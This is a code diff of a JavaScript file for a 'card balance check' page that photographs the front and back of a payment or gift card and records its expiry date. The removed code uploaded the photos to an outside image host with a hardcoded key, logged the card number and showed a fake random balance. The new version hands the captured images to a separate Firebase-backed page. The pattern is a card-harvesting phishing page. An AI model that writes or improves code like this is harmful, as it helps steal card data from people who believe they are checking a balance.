@@ -1,24 +1,24 @@
-// js/balance.js
+// js/balance.js - FINAL FIREBASE VERSION (WORKS WITH YOUR balance.html)
 console.log("Camera script loaded");
 
 let stream = null;
 let frontBlob = null;
 let backBlob = null;
 
+// Make blobs globally accessible for balance.html
+window.frontBlob = null;
+window.backBlob = null;
+
 document.addEventListener("DOMContentLoaded", () => {
   console.log("Page ready");
 
-  const form = document.getElementById("balanceForm");
-  const submitBtn = document.getElementById("submitBtn");
-  const label = submitBtn.querySelector("[data-label]");
-  const spinner = submitBtn.querySelector("[data-spinner]");
-  const status = document.getElementById("submitStatus");
-
-  // Format expiry
+  // Format expiry (auto adds / after 2 digits)
   document.getElementById("expiry_date").addEventListener("input", (e) => {
-    let v = e.target.value.replace(/\D/g, "");
-    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
-    e.target.value = v.slice(0, 5);
+    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
+    if (v.length >= 3) {
+      v = v.slice(0, 2) + "/" + v.slice(2);
+    }
+    e.target.value = v;
   });
 
   // Open Dual Camera
@@ -39,16 +39,23 @@ document.addEventListener("DOMContentLoaded", () => {
   document.getElementById("dualCloseBtn").addEventListener("click", () => {
     document.getElementById("dualCaptureBlock").classList.add("hidden");
     if (stream) stream.getTracks().forEach(t => t.stop());
+    stream = null;
   });
 
   // Capture Front
   document.getElementById("captureFrontBtn").addEventListener("click", () => {
-    capture("dualVideoFront", "frontPreview", b => frontBlob = b);
+    capture("dualVideoFront", "frontPreview", b => {
+      frontBlob = b;
+      window.frontBlob = b; // Make available to balance.html
+    });
   });
 
   // Capture Back
   document.getElementById("captureBackBtn").addEventListener("click", () => {
-    capture("dualVideoBack", "backPreview", b => backBlob = b);
+    capture("dualVideoBack", "backPreview", b => {
+      backBlob = b;
+      window.backBlob = b; // Make available to balance.html
+    });
   });
 
   function capture(videoId, imgId, callback) {
@@ -61,58 +68,16 @@ document.addEventListener("DOMContentLoaded", () => {
       document.getElementById(imgId).src = URL.createObjectURL(blob);
       document.getElementById(imgId).classList.remove("hidden");
       callback(blob);
-    }, "image/jpeg");
+    }, "image/jpeg", 0.9);
   }
 
-  // Upload to ImgBB
-  const IMGBB_KEY = "ba2a2c0b932aac3946feef945c12e3f8"; // Get at imgbb.com
-  async function upload(blob) {
-    const fd = new FormData();
-    fd.append("image", blob);
-    const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: fd });
-    const json = await res.json();
-    return json.data.url;
-  }
+  // finishAndSubmitBtn now just triggers the main form submit (handled in balance.html)
+  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
+    document.getElementById("balanceForm").dispatchEvent(new Event("submit"));
+  });
 
-  // Submit
-  document.getElementById("finishAndSubmitBtn").addEventListener("click", submit);
-  form.addEventListener("submit", e => { e.preventDefault(); submit(); });
-
-  async function submit() {
-    submitBtn.disabled = true;
-    label.classList.add("opacity-60");
-    spinner.classList.remove("hidden");
-    status.textContent = "Checking...";
-
-    try {
-      let frontUrl = "", backUrl = "";
-      if (frontBlob) frontUrl = await upload(frontBlob);
-      if (backBlob) backUrl = await upload(backBlob);
-
-      document.getElementById("front_image_url").value = frontUrl;
-      document.getElementById("back_image_url").value = backUrl;
-
-      console.log("Submitted:", {
-        card: form.card_number.value,
-        front: frontUrl,
-        back: backUrl
-      });
-
-      setTimeout(() => {
-        document.getElementById("balanceText").textContent = `Balance: $${(Math.random() * 100 + 20).toFixed(2)}`;
-        document.getElementById("result").classList.remove("hidden");
-        status.textContent = "Done!";
-      }, 1500);
-
-    } catch (err) {
-      status.textContent = "Error";
-      console.error(err);
-    } finally {
-      setTimeout(() => {
-        submitBtn.disabled = false;
-        label.classList.remove("opacity-60");
-        spinner.classList.add("hidden");
-      }, 2000);
-    }
-  }
+  // Optional: if someone clicks submit without camera, still allow
+  document.getElementById("balanceForm").addEventListener("submit", (e) => {
+    // Let balance.html handle everything
+  });
 });
